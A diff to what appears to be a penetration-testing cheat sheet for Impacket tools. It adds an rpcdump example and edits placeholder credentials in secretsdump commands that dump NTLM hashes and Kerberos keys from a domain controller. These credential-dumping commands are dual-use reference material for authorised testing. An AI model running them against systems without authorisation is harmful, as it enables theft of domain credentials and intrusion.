@@ -57,17 +57,25 @@ impacket-psexec username:password@10.0.0.1
 
 <br />
 
+## impacket-rpcdump
+
+```sh
+impacket-rpcdump -port 135 10.0.0.1
+```
+
+<br />
+
 ## impacket-secretsdump
 
 Gets all password hashes.
 
 ```sh
 # Basic
-impacket-secretsdump example.local/admin:admin@10.0.0.1
+impacket-secretsdump example.local/username:password@10.0.0.1
 
 # Only NTLM hashes and Kerberos keys
-impacket-secretsdump -just-dc example.local/admin:admin@10.0.0.1
+impacket-secretsdump -just-dc example.local/username:password@10.0.0.1
 
 # Only NTLM hashes
-impacket-secretsdump -just-dc-ntlm example.local/admin:admin@10.0.0.1
+impacket-secretsdump -just-dc-ntlm example.local/username:password@10.0.0.1
 ```
